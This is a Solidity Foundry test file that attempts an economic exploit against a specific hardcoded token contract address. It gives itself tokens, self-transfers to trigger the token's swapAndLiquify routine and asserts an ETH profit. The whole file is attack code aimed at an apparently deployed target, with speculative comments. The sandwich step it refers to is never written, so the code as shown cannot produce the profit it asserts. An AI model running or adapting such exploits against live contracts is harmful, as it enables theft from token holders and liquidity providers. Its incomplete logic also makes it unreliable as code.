// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal IERC20 interface for the token
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xE2C9C976337357369845c761DD851E2B6942D69f;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to interact with the deployed contract
        // First, let's get some tokens to work with
        address attacker = address(this);

        // Get initial balances
        uint256 initialBalance = attacker.balance;

        // We need to get some tokens first - use deal to give us tokens
        // The token is at TARGET address
        deal(TARGET, attacker, 1000 * 10**9); // Decimals = 9

        // Also need some ETH for gas and potential sandwich
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Exploit: Trigger swapAndLiquify via self-transfer
        address attacker = address(this);

        // Get the token contract interface
        IERC20 token = IERC20(TARGET);

        // Check contract token balance
        uint256 contractBalance = token.balanceOf(TARGET);
        console.log("Contract token balance:", contractBalance);

        // We need to know the threshold for swapAndLiquify
        // This is stored in numTokensSellToAddToLiquidity
        // We can't read it directly as it's private, but we can estimate
        // From constructor: numTokensSellToAddToLiquidity = totalSupply_.div(10**3)
        // So threshold is ~0.1% of total supply

        // Try to trigger swapAndLiquify by self-transferring
        // First, check if we're excluded from fee (we shouldn't be)
        // If we're excluded, no fees would accumulate in contract

        // Perform a small self-transfer to see if it triggers anything
        uint256 myBalance = token.balanceOf(attacker);
        console.log("My token balance before:", myBalance);

        // We need to transfer to ourselves
        // This should trigger _transfer with from == to == attacker
        // The condition 'from != uniswapV2Pair' will be true (attacker != pair)
        // So if contractBalance >= threshold, swapAndLiquify should trigger

        token.transfer(attacker, 1);

        console.log("Self-transfer executed");

        // Check if anything happened by looking at contract balance again
        uint256 newContractBalance = token.balanceOf(TARGET);
        console.log("Contract token balance after:", newContractBalance);

        // Also check our ETH balance in case we got some from sandwich
        uint256 ethBalanceAfter = attacker.balance;
        console.log("ETH balance after:", ethBalanceAfter);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
